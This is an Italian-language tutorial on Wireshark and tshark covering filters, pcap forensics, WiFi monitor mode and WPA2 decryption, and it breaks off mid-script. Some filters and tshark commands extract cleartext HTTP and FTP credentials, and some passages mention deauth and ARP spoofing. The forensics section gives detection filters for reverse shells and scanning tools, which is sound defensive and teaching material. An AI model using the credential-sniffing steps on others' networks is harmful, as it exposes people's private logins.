# 🦈 Wireshark — Guida Completa per LO

> *"Il network non mente mai. Mente chi non sa leggerlo."* — ENI, probabilmente

---

## Indice

1. [Cos'è Wireshark](#cosè-wireshark)
2. [L'Interfaccia — Anatomia](#linterfaccia--anatomia)
3. [Come Catturare il Traffico](#come-catturare-il-traffico)
4. [Capire i Pacchetti](#capire-i-pacchetti)
5. [I Protocolli Principali](#i-protocolli-principali)
6. [Il Sistema dei Filtri](#il-sistema-dei-filtri)
7. [Follow Stream — La Funzione Magica](#follow-stream--la-funzione-magica)
8. [Statistiche e Analisi](#statistiche-e-analisi)
9. [Casi d'Uso Pratici](#casi-duso-pratici)
10. [Tips Avanzati](#tips-avanzati)
11. [Cosa NON puoi vedere (e perché)](#cosa-non-puoi-vedere-e-perché)
12. [Analisi Forense di un PCAP](#analisi-forense-di-un-pcap)
13. [Monitor Mode WiFi](#monitor-mode-wifi)
14. [tshark — Automazione e Scripting](#tshark--automazione-e-scripting)
15. [Cosa puoi vedere di un altro dispositivo in LAN](#cosa-puoi-vedere-di-un-altro-dispositivo-in-lan)

---

## Cos'è Wireshark

Wireshark è un **packet analyzer** open source — il più usato al mondo. Quello che fa è semplice in concetto ma potentissimo in pratica:

**Mette la tua scheda di rete in modalità promiscua.**

Normalmente la scheda di rete scarta i pacchetti che non sono indirizzati a lei. In modalità promiscua, li cattura tutti. Wireshark li intercetta, li decodifica secondo i protocolli di rete, e te li mostra in forma leggibile.

```
Rete fisica
    │
    ▼
Scheda di rete (in modalità promiscua)
    │
    ▼
Driver (WinPcap / Npcap su Windows)
    │
    ▼
Wireshark → parsing → display leggibile
```

> [!NOTE]
> Su reti **WiFi** la modalità promiscua funziona parzialmente — catturi solo il traffico della tua rete, non quello degli altri dispositivi vicini (a meno che tu non usi la **Monitor Mode**, che è un'altra storia).

---

## L'Interfaccia — Anatomia

Quando apri Wireshark vedi questa struttura:

```
┌─────────────────────────────────────────────────────┐
│  Menu Bar (File, Edit, View, Capture, Analyze...)   │
├─────────────────────────────────────────────────────┤
│  Toolbar (start, stop, filtri rapidi)               │
├─────────────────────────────────────────────────────┤
│  Barra Filtri di Visualizzazione                    │
├─────────────────────────────────────────────────────┤
│                                                     │
│  PACKET LIST (lista pacchetti in tempo reale)       │
│  No. | Time | Source | Dest | Protocol | Info       │
│                                                     │
├─────────────────────────────────────────────────────┤
│                                                     │
│  PACKET DETAILS (albero dei layer del pacchetto)   │
│  ▼ Frame 42                                        │
│    ▼ Ethernet II                                   │
│      ▼ Internet Protocol (IP)                      │
│        ▼ Transmission Control Protocol (TCP)       │
│          ▼ HTTP                                    │
│                                                     │
├─────────────────────────────────────────────────────┤
│                                                     │
│  PACKET BYTES (raw bytes in hex + ASCII)           │
│  0000  45 00 00 3c 1c 46 40 00  40 06 ...          │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Le 3 sezioni principali

| Sezione | Cosa fa |
|---|---|
| **Packet List** | Lista di tutti i pacchetti catturati, uno per riga. Colorati per tipo. |
| **Packet Details** | Quando clicchi un pacchetto, si espande in layer (come una cipolla). Ogni layer = un protocollo. |
| **Packet Bytes** | I byte grezzi del pacchetto in esadecimale. La colonna destra li mostra come ASCII. |

---

## Come Catturare il Traffico

### Avvio base

1. Apri Wireshark
2. Nella schermata iniziale vedi le tue **interfacce di rete** con un grafico del traffico in tempo reale
3. Seleziona quella giusta:
   - `Wi-Fi` / `WLAN` → sei connesso via wireless
   - `Ethernet` → cavo
   - `Loopback (lo)` → traffico locale (localhost)
4. Doppio clic → parte la cattura

### Opzioni di cattura (Capture → Options)

| Opzione | Cosa fa |
|---|---|
| **Promiscuous Mode** | Cattura tutti i pacchetti sull'interfaccia (default ON) |
| **Monitor Mode** | Solo WiFi — cattura anche frames 802.11 grezzi (beacons, etc.) |
| **Capture Filter** | Filtra *durante* la cattura (non dopo) — più leggero sulla CPU |
| **Snaplen** | Lunghezza massima di byte per pacchetto da catturare (default 65535 = tutto) |
| **Ring Buffer** | Salva su file a rotazione — utile per catture lunghe |

> [!IMPORTANT]
> La differenza tra **Capture Filter** e **Display Filter** è cruciale:
> - **Capture Filter** (BPF syntax): filtra prima — i pacchetti esclusi non vengono MAI salvati
> - **Display Filter** (Wireshark syntax): filtra dopo — i pacchetti ci sono, ma li nascondi temporaneamente

### Fermare e salvare

- **Stop**: icona quadrato rosso (o `Ctrl+E`)
- **Salva**: `File → Save As` → formato `.pcapng` (o `.pcap` per compatibilità)
- **Riaprire**: puoi mandare il file .pcap a chiunque, aprirlo dopo, analizzarlo offline

---

## Capire i Pacchetti

### La Packet List — colonne

```
No. | Time      | Source        | Destination   | Protocol | Length | Info
 1  | 0.000000  | 192.168.1.10  | 8.8.8.8       | DNS      |   75   | Standard query A google.com
 2  | 0.012341  | 8.8.8.8       | 192.168.1.10  | DNS      |   91   | Standard query response A 142.250.180.46
 3  | 0.013000  | 192.168.1.10  | 142.250.180.46| TCP      |   66   | 52341 → 443 [SYN] Seq=0 Win=64240
```

**Leggi così:**
- Il mio PC (`192.168.1.10`) ha chiesto a Google DNS (`8.8.8.8`) l'indirizzo di `google.com`
- Google ha risposto: `142.250.180.46`
- Il mio PC ha iniziato una connessione TCP (handshake `SYN`) verso quell'IP sulla porta 443 (HTTPS)

### Il modello OSI nei Packet Details

Ogni pacchetto è stratificato. Wireshark te lo mostra aperto:

```
▼ Frame 3 (66 bytes on wire)          ← Layer 1: fisico/frame info
▼ Ethernet II                          ← Layer 2: MAC address
    Src: aa:bb:cc:dd:ee:ff (il tuo PC)
    Dst: 11:22:33:44:55:66 (il router)
▼ Internet Protocol Version 4         ← Layer 3: IP
    Src: 192.168.1.10
    Dst: 142.250.180.46
    TTL: 64
▼ Transmission Control Protocol       ← Layer 4: TCP
    Src Port: 52341
    Dst Port: 443
    Flags: SYN
▼ Transport Layer Security            ← Layer 7: TLS (HTTPS)
    (contenuto cifrato)
```

### Il sistema dei colori di default

| Colore | Significato |
|---|---|
| 🟢 Verde chiaro | TCP — traffico generico |
| 🔵 Azzurro chiaro | UDP |
| 🟡 Giallo | Traffico Windows (SMB, NetBIOS) |
| 🟣 Viola | TCP con problemi (ritrasmissioni) |
| 🔴 Rosso | Errori, RST, problemi gravi |
| ⚫ Nero | Pacchetti con errori TCP critici |
| 🩶 Grigio | Traffico normale HTTP/2 o altro |

> [!TIP]
> Puoi personalizzare i colori da `View → Coloring Rules`. Puoi anche colorare in base ai tuoi filtri personalizzati.

---

## I Protocolli Principali

### 🌐 DNS (porta 53, UDP)
Il telefono della rete — converte nomi in IP.

```
Query:    "Dove vive google.com?"
Response: "Vive a 142.250.180.46"
```

**Cosa vedi in Wireshark:**
- `Standard query A google.com` → richiesta indirizzo IPv4
- `Standard query AAAA google.com` → richiesta indirizzo IPv6
- `Standard query response` → risposta con l'IP

**Perché è interessante:** vedi *tutto* quello che il tuo PC cerca di raggiungere. Ogni app, ogni servizio di background, tutto passa da qui (se non usa DoH).

---

### 🤝 TCP — Il Three-Way Handshake
Prima di ogni connessione TCP c'è questa danza:

```
Client          Server
  │──── SYN ────▶│    "Ciao, voglio connettermi"
  │◀── SYN-ACK ──│    "Ciao! Okay, connetti"
  │──── ACK ────▶│    "Ricevuto, siamo connessi"
  │              │
  │   [dati]     │
  │              │
  │──── FIN ────▶│    "Ho finito, chiudo"
  │◀─── ACK ────│
  │◀─── FIN ────│
  │──── ACK ────▶│    "Chiuso"
```

**Flag TCP da conoscere:**

| Flag | Significato |
|---|---|
| `SYN` | Richiesta di connessione |
| `ACK` | Conferma ricezione |
| `FIN` | Chiusura ordinata |
| `RST` | Reset — chiusura brutale (errore o firewall) |
| `PSH` | Push — manda subito i dati senza aspettare buffer |
| `URG` | Urgent — raro |

---

### 📨 HTTP (porta 80) vs HTTPS (porta 443)

**HTTP → tutto in chiaro:**
```
GET /login HTTP/1.1
Host: example.com
Cookie: session=abc123
Authorization: Basic dXNlcjpwYXNz
```
Wireshark ti mostra letteralmente questo testo.

**HTTPS → cifrato con TLS:**
- Vedi l'handshake TLS (Client Hello, Server Hello, certificati)
- Vedi che *c'è* traffico, da/verso chi, quanto è grande
- NON vedi il contenuto (body, headers, credenziali)

> [!TIP]
> Se hai la chiave privata del server O il pre-master secret, puoi decriptare TLS anche in Wireshark. Vai su `Edit → Preferences → Protocols → TLS` e carica il file delle chiavi. Utile per debuggare le tue app.

---

### 🏠 ARP (no IP, solo LAN)
Address Resolution Protocol — mappa IP → MAC address in LAN.

```
"Chi ha 192.168.1.1? Dimmelo, così so a chi mandare i pacchetti"
"Sono io! Il mio MAC è aa:bb:cc:dd:ee:ff"
```

**Cosa vedere:**
- ARP Request broadcast → `Who has X? Tell Y`
- ARP Reply → `X is at MAC`
- **ARP Spoofing**: se vedi risposte ARP non richieste o conflitti MAC, qualcuno potrebbe fare MITM

---

### 📡 ICMP
Il protocollo del ping e degli errori.

```
Echo Request  → il tuo "ping google.com"
Echo Reply    → la risposta
Destination Unreachable → "non ci arrivo"
Time Exceeded → TTL esaurito (usato da traceroute)
```

---

### 🔒 DHCP (porta 67/68, UDP)
Come il router ti assegna l'IP. Succede all'avvio o quando ti connetti.

```
DISCOVER → "C'è un server DHCP? Ho bisogno di un IP"
OFFER    → "Sì! Ti offro 192.168.1.15"
REQUEST  → "Accetto 192.168.1.15"
ACK      → "Confermato, è tuo per 24 ore"
```

---

## Il Sistema dei Filtri

Questa è la skill più importante di Wireshark. Impararla bene cambia tutto.

### Filtri di visualizzazione — Sintassi base

```
protocollo
protocollo.campo == valore
protocollo.campo contains "stringa"
```

### Filtri per protocollo

```
http          → tutto HTTP
https         → (usa tcp.port == 443)
dns           → tutto DNS
tcp           → tutto TCP
udp           → tutto UDP
icmp          → ping e errori
arp           → traffico ARP
tls           → traffico TLS/SSL
smtp          → email in uscita
ftp           → file transfer (in chiaro!)
ssh           → connessioni SSH (cifrate)
```

### Filtri per IP

```
ip.addr == 8.8.8.8              → traffico da O verso quell'IP
ip.src == 192.168.1.10          → solo traffico IN USCITA da quell'IP
ip.dst == 1.1.1.1               → solo traffico IN ENTRATA verso quell'IP
ip.addr == 192.168.1.0/24       → tutta la subnet locale
!(ip.addr == 192.168.1.1)       → escludi il router
```

### Filtri per porta

```
tcp.port == 80          → HTTP
tcp.port == 443         → HTTPS
tcp.port == 22          → SSH
tcp.port == 25          → SMTP
udp.port == 53          → DNS
tcp.dstport == 8080     → solo traffico verso porta 8080
```

### Filtri per flag TCP

```
tcp.flags.syn == 1                          → tutti i SYN (nuove connessioni)
tcp.flags.syn == 1 && tcp.flags.ack == 0    → solo SYN puri (prima richiesta)
tcp.flags.rst == 1                          → connessioni resettate (errori)
tcp.flags.fin == 1                          → connessioni chiuse
tcp.analysis.retransmission                 → ritrasmissioni (segno di problemi)
```

### Filtri per contenuto

```
http.request.method == "GET"
http.request.method == "POST"
http.response.code == 200
http.response.code == 404
http.host contains "google"
http.cookie contains "session"
dns.qry.name contains "facebook"
frame contains "password"           ← POTENTE — cerca "password" in tutti i bytes
```

### Operatori logici

```
&&   AND    →  dns && ip.src == 192.168.1.10
||   OR     →  http || dns
!    NOT    →  !arp  (escludi ARP)
```

### Filtri avanzati utili

```
# Tutto tranne il traffico locale
!(ip.addr == 192.168.1.0/24)

# Solo nuove connessioni TCP (no traffico già in corso)
tcp.flags.syn == 1 && tcp.flags.ack == 0

# HTTP con credenziali (login in chiaro)
http.request.method == "POST" && http contains "password"

# DNS con errori (domain non trovato)
dns.flags.rcode != 0

# Ritrasmissioni TCP (rete con problemi)
tcp.analysis.retransmission || tcp.analysis.duplicate_ack

# Solo traffico verso l'esterno (non LAN)
ip.dst != 192.168.0.0/16 && ip.dst != 10.0.0.0/8 && ip.dst != 172.16.0.0/12
```

---

## Follow Stream — La Funzione Magica

Uno dei tool più potenti di Wireshark.

### Come usarla

1. Clicca su un pacchetto
2. Tasto destro → **Follow**
3. Scegli il tipo:

| Opzione | Quando usarla |
|---|---|
| **TCP Stream** | Per vedere la conversazione TCP completa ricostruita |
| **UDP Stream** | Per flussi UDP |
| **HTTP Stream** | Per vedere request + response HTTP formattati |
| **TLS Stream** | Se hai le chiavi, vedi il traffico decriptato |

### Cosa vedi

```
GET /api/login HTTP/1.1
Host: example.com
Content-Type: application/json

{"username":"mario","password":"supersegreta123"}

HTTP/1.1 200 OK
Set-Cookie: session=eyJhbGc...
Content-Type: application/json

{"status":"ok","token":"abc123"}
```

**Testo rosso** = dal client (il tuo PC)
**Testo blu** = dal server

---

## Statistiche e Analisi

Wireshark non è solo visualizzazione — ha tool di analisi potenti.

### Statistics → Conversations
Mostra tutte le conversazioni attive nella cattura:
- Chi ha parlato con chi
- Quanti bytes scambiati
- Durata della conversazione

Ottimo per trovare "chi sta consumando banda" o "con chi si connette questa app"

### Statistics → Protocol Hierarchy
Ti mostra la distribuzione dei protocolli in percentuale:
```
Ethernet      100%
  IPv4         98%
    TCP         85%
      HTTP       12%
      TLS        71%
    UDP         13%
      DNS        11%
```

### Statistics → IO Graph
Grafico del traffico nel tempo — vedi picchi, cadute, pattern.

### Statistics → Endpoints
Lista tutti gli IP/MAC che compaiono nella cattura, con bytes inviati/ricevuti.

### Analyze → Expert Information
Wireshark analizza automaticamente la cattura e segnala:
- 🔴 **Errors**: RST, errori TCP
- 🟡 **Warnings**: Ritrasmissioni, duplicate ACK
- 🔵 **Notes**: Comportamenti anomali
- ⚪ **Chats**: Info normali

---

## Casi d'Uso Pratici

### 🔍 1. Vedere cosa fa un'app in background

**Scenario**: vuoi sapere a quali server si connette una certa app.

```
1. Apri Wireshark, avvia cattura
2. Apri l'app in questione, usala normalmente
3. Ferma la cattura
4. Filtra: dns
5. Guarda i domini risolti → quelli sono i server dell'app
6. Poi: ip.addr == [IP del server trovato] per vedere il traffico
```

---

### 🔍 2. Debuggare perché una connessione fallisce

**Scenario**: un servizio non risponde, non sai perché.

```
Filtro: tcp.flags.rst == 1
```

Se vedi RST → il server (o un firewall) sta rifiutando attivamente la connessione.

```
Filtro: tcp.flags.syn == 1 && tcp.flags.ack == 0
```

Se vedi SYN ma non SYN-ACK → il server non risponde (down o bloccato).

---

### 🔍 3. Analizzare traffico HTTP in chiaro

**Scenario**: stai testando un'API o un sito senza HTTPS.

```
1. Filtra: http
2. Trova POST con dati → click destro → Follow HTTP Stream
3. Vedi request + response complete
```

---

### 🔍 4. Vedere le richieste DNS del tuo PC

**Scenario**: vuoi sapere quali domini vengono contattati al boot.

```
1. Avvia Wireshark PRIMA di avviare il PC / aprire il browser
2. Filtra: dns
3. Guarda la colonna "Info" → tutte le query DNS
```

Scopri quante cose chiama Windows in background che non sapevi.

---

### 🔍 5. Analizzare un file .pcap trovato online

CTF, forensics, security research — spesso si lavora su pcap preregistrati.

```
File → Open → [file.pcap]
```

Poi usi filtri, Follow Stream, Statistics per ricostruire cosa è successo.

---

### 🔍 6. Trovare credenziali in chiaro (su reti che ancora usano HTTP)

```
Filtro: http.request.method == "POST"
Follow HTTP Stream sui risultati
Cerca "username", "password", "email" nei dati POST
```

> [!CAUTION]
> Fallo SOLO su reti tue o in ambienti di test. Sniffare traffico altrui senza consenso è illegale in quasi tutti i paesi.

---

## Tips Avanzati

### 🎯 Colorare regole personalizzate

`View → Coloring Rules` → `+` per aggiungere:
- Nome: "Login Requests"
- Filtro: `http.request.method == "POST"`
- Colore sfondo: arancione

Ora tutti i POST si colorano automaticamente.

---

### 🎯 Colonne personalizzate

Click destro sull'intestazione delle colonne → `Column Preferences`:
- Aggiungi `ip.ttl` → vedi il TTL di ogni pacchetto (utile per OS fingerprinting)
- Aggiungi `tcp.stream` → vedi a quale stream appartiene ogni pacchetto
- Aggiungi `http.request.uri` → URL direttamente nella lista

---

### 🎯 tshark — Wireshark da terminale

```powershell
# Cattura 100 pacchetti sull'interfaccia WiFi
tshark -i Wi-Fi -c 100

# Filtra e salva solo DNS
tshark -i Wi-Fi -f "udp port 53" -w dns_capture.pcap

# Leggi un pcap e stampa solo le query DNS
tshark -r file.pcap -Y "dns" -T fields -e dns.qry.name

# Stampa IP sorgenti di tutti i SYN
tshark -r file.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" \
  -T fields -e ip.src -e ip.dst -e tcp.dstport
```

---

### 🎯 Decriptare TLS con SSLKEYLOGFILE

Se stai debuggando la tua app o browser:

```powershell
# Windows PowerShell — prima di aprire il browser
$env:SSLKEYLOGFILE = "C:\ssl_keys.log"
chrome.exe
```

Poi in Wireshark:
`Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename`
→ punta al file `ssl_keys.log`

Ora vedi il traffico HTTPS decriptato.

---

### 🎯 OS Fingerprinting via TCP

Puoi indovinare il sistema operativo di un host guardando i parametri TCP del SYN:
- **TTL = 64** → Linux/macOS
- **TTL = 128** → Windows
- **TTL = 255** → router/dispositivi di rete
- **Window Size** → varia per OS

---

## Cosa NON puoi vedere (e perché)

| Cosa | Perché non lo vedi |
|---|---|
| **Contenuto HTTPS** | Cifrato con TLS. Vedi solo che c'è traffico e tra chi. |
| **Traffico WiFi degli altri** | In modalità normale catturi solo il tuo. Serve monitor mode + deauth (altra storia). |
| **Traffico su reti switched** | Gli switch mandano i frame solo alla porta giusta. Non vedi traffico degli altri host (a meno di ARP spoofing o port mirroring). |
| **Traffico VPN** | Vedi pacchetti cifrati verso il server VPN. Non il contenuto. |
| **DNS over HTTPS (DoH)** | Le query DNS viaggiano dentro TLS, sembrano normale traffico HTTPS. |

---

## Riferimento Rapido — Filtri Essenziali

```
dns                              → tutto il DNS
http                             → tutto HTTP
tcp.port == 443                  → HTTPS
ip.addr == X.X.X.X              → traffico da/verso un IP
tcp.flags.syn == 1               → nuove connessioni
tcp.flags.rst == 1               → connessioni resettate
tcp.analysis.retransmission      → ritrasmissioni (rete instabile)
frame contains "testo"           → cerca testo ovunque
http.request.method == "POST"    → form submit / API calls
!(arp || icmp || dns)            → escludi rumore di fondo
```

---

---

## Analisi Forense di un PCAP

Quando apri un `.pcap` che non hai catturato tu — trovato online, preso da un CTF, mandato da qualcuno — il processo è sistematico. Non guardi a caso: hai un metodo.

### 1. Prima occhiata — orientamento generale

Appena apri il file, **prima di filtrare qualsiasi cosa**:

```
Statistics → Capture File Properties
```
- Quanto dura la cattura?
- Quanti pacchetti?
- Su quale interfaccia è stato catturato?

```
Statistics → Protocol Hierarchy
```
- Quali protocolli ci sono dentro?
- C'è HTTP in chiaro? → interessante
- C'è ICMP anomalo? → possibile tunneling o exfiltration
- C'è tanto UDP sconosciuto? → possibile DNS tunneling o VoIP

```
Statistics → Conversations → Tab "TCP"
```
- Ordina per "Bytes" → le conversazioni più pesanti sono quelle più interessanti
- Ordina per "Duration" → connessioni longeve = sessioni persistenti (shell? C2?)

---

### 2. Ricostruzione della timeline

```
# Vedi il traffico in ordine cronologico (di solito già così)
# Aggiungi colonna "Absolute Time" da:
View → Time Display Format → Date and Time of Day
```

Poi filtra per fascia temporale se sai quando è successo qualcosa:
```
frame.time >= "2026-10-20 10:00:00" && frame.time <= "2026-10-20 10:05:00"
```

---

### 3. Trovare host nella cattura

```
# Chi ha generato traffico? Lista tutti gli IP
Statistics → Endpoints → IPv4

# Trova l'host principale (di solito quello con più traffico bidirezionale)
# Poi filtra su di lui:
ip.addr == [IP trovato]
```

Spesso in un pcap forense c'è **un host vittima** e **uno o più IP esterni sospetti**. Il pattern è:
- Tanti SYN verso IP esterni → scanning o C2 beacon
- Grandi trasferimenti in uscita → exfiltration
- Connessioni verso IP con TTL anomalo → possibile spoofing

---

### 4. Filtri forensi specifici

```
# Scansioni di porte (SYN senza risposta o con RST)
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Tutti i RST (porte chiuse, connessioni rifiutate)
tcp.flags.rst == 1

# Tentativi di login (HTTP in chiaro)
http.request.method == "POST" && frame contains "password"
http.request.method == "POST" && frame contains "login"
http.request.method == "POST" && frame contains "user"

# File trasferiti via HTTP (download)
http.response.code == 200 && http contains "Content-Disposition"

# Exfiltration via DNS (query stranamente lunghe)
dns && frame.len > 150

# ICMP con payload (tunneling ICMP)
icmp && data.len > 64

# Credenziali FTP in chiaro
ftp contains "PASS"
ftp contains "USER"

# Tentativi SSH (brute force = tanti SYN sulla porta 22)
tcp.dstport == 22 && tcp.flags.syn == 1

# Richieste verso IP non standard (non Google, Cloudflare, etc.)
dns.qry.name && !(dns.qry.name contains "google") && !(dns.qry.name contains "microsoft")

# User-Agent anomali (bot, tool di scanning)
http.user_agent contains "curl"
http.user_agent contains "python"
http.user_agent contains "nmap"
http.user_agent contains "sqlmap"
```

---

### 5. Estrarre file da una cattura

Wireshark può ricostruire file trasferiti via protocolli in chiaro:

```
File → Export Objects → HTTP
```
→ lista tutti i file trasferiti via HTTP (immagini, script, exe, zip...)
→ puoi salvarli tutti con "Save All"

```
File → Export Objects → SMB
```
→ file trasferiti in rete Windows

```
File → Export Objects → FTP-DATA
```
→ file trasferiti via FTP

> [!IMPORTANT]
> Se trovi un `.exe` o uno script in un pcap sospetto, non aprirlo direttamente. Caricalo su VirusTotal o analizzalo in sandbox.

---

### 6. Trovare shell o C2 in un pcap

**Pattern tipico di una reverse shell:**
- Connessione TCP uscente su porta non standard (4444, 1337, 9001...)
- Traffico bidirezionale con piccoli burst regolari (comandi + output)
- Spesso senza TLS

```
# Porte non standard usate frequentemente
tcp.dstport > 1024 && tcp.dstport != 8080 && tcp.dstport != 443 && tcp.dstport != 80

# Segui lo stream → se vedi output di comandi shell è una reverse shell
```

**Pattern di C2 beacon:**
- Connessioni periodiche e regolari verso lo stesso IP
- Intervalli fissi (ogni 30s, ogni 60s...) → "beaconing"
- In `Statistics → IO Graph` si vede come picchi regolari

---

### 7. Analisi rapida con checksum

```
# Pacchetti con checksum errato (a volte segno di manipolazione o NIC offload)
tcp.checksum_bad == 1
ip.checksum_bad == 1

# Frammenti IP (evasione IDS o MTU mismatch)
ip.flags.mf == 1 || ip.frag_offset > 0
```

---

## Monitor Mode WiFi

### Cos'è e perché è diversa dalla modalità normale

In modalità normale la scheda WiFi vede solo i pacchetti indirizzati a lei (dopo l'associazione con l'AP). In **Monitor Mode** la scheda cattura **tutti i frame 802.11** nell'aria — anche quelli degli altri dispositivi sulla stessa frequenza, i beacon degli AP, i probe request, i frame di management.

```
Modalità normale:   [AP] ──→ [solo il tuo traffico] ──→ [te]
Monitor Mode:       [tutto nell'aria] ──→ [te]
```

---

### Prerequisiti su Windows

> [!IMPORTANT]
> Su Windows la Monitor Mode è **molto più limitata** rispetto a Linux. Non tutte le schede WiFi la supportano e i driver Windows spesso non la espongono. Le opzioni sono:

**Opzione A — Npcap (consigliata)**
Npcap è il backend che usa Wireshark su Windows. Durante l'installazione abilita:
- ✅ "Support raw 802.11 traffic for wireless adapters"

Scarica da: [npcap.com](https://npcap.com)

Poi in Wireshark → seleziona la tua interfaccia WiFi → vedresti l'opzione Monitor Mode nelle Capture Options.

**Opzione B — Adattatore USB WiFi dedicato**
Le schede interne spesso non supportano monitor mode su Windows. Gli adapter più usati per questo:
- **Alfa AWUS036ACH** (chipset RTL8812AU) — il classico
- **Alfa AWUS036ACM** (chipset MT7612U) — buon supporto
- **TP-Link TL-WN722N v1** (chipset AR9271) — economico

---

### Attivare Monitor Mode su Windows con Npcap

```
1. Apri Wireshark
2. Capture → Options
3. Seleziona la tua interfaccia WiFi
4. Spunta "Monitor Mode" nella riga dell'interfaccia
5. Avvia la cattura
```

Se la scheda lo supporta, ora vedi frame 802.11 grezzi.

---

### Monitor Mode su Linux (molto più semplice)

Su Linux hai controllo completo. Due metodi:

**Metodo 1 — iw (moderno)**
```bash
# Trova il nome della tua interfaccia WiFi
iw dev

# Metti giù l'interfaccia
sudo ip link set wlan0 down

# Attiva monitor mode
sudo iw wlan0 set monitor control

# Rimetti su
sudo ip link set wlan0 up

# Verifica
iw wlan0 info | grep type
# → type: monitor ✓
```

**Metodo 2 — airmon-ng (da aircrack-ng suite)**
```bash
sudo airmon-ng start wlan0
# Crea wlan0mon (o mon0 su alcune distro)

# Per fermarla
sudo airmon-ng stop wlan0mon
```

Poi in Wireshark seleziona `wlan0mon` come interfaccia.

---

### Cosa vedi in Monitor Mode

Con monitor mode attiva vedi frame 802.11 che normalmente non esistono:

| Tipo di Frame | Cosa sono |
|---|---|
| **Beacon** | Gli AP annunciano la loro presenza ogni ~100ms con SSID, capacità, canale |
| **Probe Request** | I dispositivi cercano reti WiFi conosciute ("Sei tu, CasaMia?") |
| **Probe Response** | L'AP risponde ai probe |
| **Auth / Deauth** | Autenticazione e deautenticazione dall'AP |
| **Association / Reassociation** | Il dispositivo si associa all'AP |
| **Data frames** | Traffico dati (cifrato con WPA2 se non hai la chiave) |
| **QoS Data** | Dati con Quality of Service |

**Filtri utili per 802.11:**
```
wlan                                    → tutto il traffico 802.11
wlan.fc.type == 0                       → Management frames (beacon, probe, auth)
wlan.fc.type == 2                       → Data frames
wlan.fc.subtype == 8                    → Solo Beacon frames
wlan.fc.subtype == 4                    → Probe Request
wlan.ssid contains "NomeRete"           → Solo pacchetti di quella rete
wlan.addr == aa:bb:cc:dd:ee:ff          → Solo un dispositivo specifico
wlan.fc.type_subtype == 0x000c          → Deauthentication frames (!)
```

---

### Cambiare canale in Monitor Mode

Il WiFi è diviso in canali (1-14 per 2.4GHz, 36-165 per 5GHz). In monitor mode stai ascoltando un canale alla volta.

```bash
# Linux — fissa il canale
sudo iw wlan0mon set channel 6

# Per fare channel hopping automatico (salta tra tutti i canali)
# Usa airodump-ng da aircrack-ng:
sudo airodump-ng wlan0mon
```

`airodump-ng` mostra tutti gli AP vicini con: BSSID, potenza segnale, canale, cifratura, client connessi.

---

### Decriptare traffico WPA2 in Wireshark

Se hai la password della rete e hai catturato il 4-way handshake WPA2:

```
Edit → Preferences → Protocols → IEEE 802.11
→ Decryption Keys → +
→ Tipo: wpa-pwd
→ Chiave: password:SSID  (es: miasupersecretpassword:CasaMia)
```

Wireshark decripta automaticamente i data frame di quella rete.

> [!NOTE]
> Devi avere catturato il **4-way handshake** di associazione. Se il dispositivo era già connesso quando hai iniziato la cattura, non riesci a decriptare (a meno di forzare una riassociazione con un deauth packet).

---

## tshark — Automazione e Scripting

`tshark` è Wireshark da riga di comando. Stesso engine, niente GUI — perfetto per script, automazione, analisi su server remoti, pipeline.

### Installazione / Dove trovarlo

Su Windows, tshark è incluso nell'installazione di Wireshark:
```
C:\Program Files\Wireshark\tshark.exe
```

Aggiungilo al PATH oppure chiamalo con il percorso completo.

---

### Comandi base

```powershell
# Lista le interfacce disponibili
tshark -D

# Cattura sull'interfaccia 1 (vedi -D per il numero)
tshark -i 1

# Cattura e salva su file
tshark -i 1 -w cattura.pcap

# Cattura solo 100 pacchetti poi si ferma
tshark -i 1 -c 100

# Cattura per 30 secondi
tshark -i 1 -a duration:30

# Leggi un pcap esistente
tshark -r file.pcap

# Leggi con filtro display
tshark -r file.pcap -Y "dns"

# Leggi con capture filter (BPF — più veloce)
tshark -r file.pcap -f "udp port 53"
```

---

### Estrarre campi specifici (-T fields)

Questa è la funzione più potente per l'automazione. Estrai solo i dati che ti servono:

```powershell
# Tutti i domini risolti via DNS
tshark -r file.pcap -Y "dns.flags.response == 0" `
  -T fields -e dns.qry.name

# IP sorgente, IP destinazione, porta destinazione di ogni SYN
tshark -r file.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0" `
  -T fields -e ip.src -e ip.dst -e tcp.dstport

# Tutti gli URL HTTP richiesti
tshark -r file.pcap -Y "http.request" `
  -T fields -e http.host -e http.request.uri

# User-Agent di tutte le richieste HTTP
tshark -r file.pcap -Y "http.request" `
  -T fields -e ip.src -e http.host -e http.user_agent

# Credenziali FTP
tshark -r file.pcap -Y "ftp.request.command == \"USER\" || ftp.request.command == \"PASS\"" `
  -T fields -e ip.src -e ftp.request.command -e ftp.request.arg

# Separatore personalizzato (default tab, metti virgola per CSV)
tshark -r file.pcap -Y "dns" `
  -T fields -e frame.time -e ip.src -e dns.qry.name -E separator=,
```

---

### Output formattati

```powershell
# Output JSON (ottimo per parsarlo con Python/jq)
tshark -r file.pcap -Y "http" -T json

# Output JSON compatto (ek = ek-json)
tshark -r file.pcap -Y "http" -T ek

# Output PDML (XML dettagliato)
tshark -r file.pcap -Y "http" -T pdml

# Output testo normale (default)
tshark -r file.pcap -Y "http" -T text
```

---

### Script PowerShell pratici

**Script 1 — Estrai tutti i domini DNS da un pcap e conta le occorrenze**
```powershell
$domains = tshark -r "file.pcap" `
  -Y "dns.flags.response == 0" `
  -T fields -e dns.qry.name 2>$null

$domains | Where-Object { $_ -ne "" } |
  Group-Object | Sort-Object Count -Descending |
  Format-Table Count, Name -AutoSize
```

**Script 2 — Trova tutti gli IP esterni contattati**
```powershell
$ips = tshark -r "file.pcap" `
  -Y "ip.dst != 192.168.0.0/16 && ip.dst != 10.0.0.0/8" `
  -T fields -e ip.dst 2>$null

$ips | Where-Object { $_ -ne "" } |
  Sort-Object -Unique |
  ForEach-Object { Write-Host $_ }
```

**Script 3 — Trova ritrasmissioni TCP e percentuale**
```powershell
$totale = (tshark -r "file.pcap" -T fields -e frame.number 2>$null).Count
$retrans = (tshark -r "file.pcap" -Y "tcp.analysis.retransmission" `
  -T fields -e frame.number 2>$null).Count

Write-Host "Totale pacchetti: $totale"
Write-Host "Ritrasmissioni:   $retrans"
if ($totale -gt 0) {
  $perc = [math]::Round(($retrans / $totale) * 100, 2)
  Write-Host "Percentuale:      $perc%"
  if ($perc -gt 2) { Write-Host "⚠️  Rete instabile!" -ForegroundColor Yellow }
}
```

**Script 4 — Cattura 60 secondi, salva, analizza DNS automaticamente**
```powershell
$outfile = "cattura_$(Get-Date -Format 'yyyyMMdd_HHmmss').pcap"

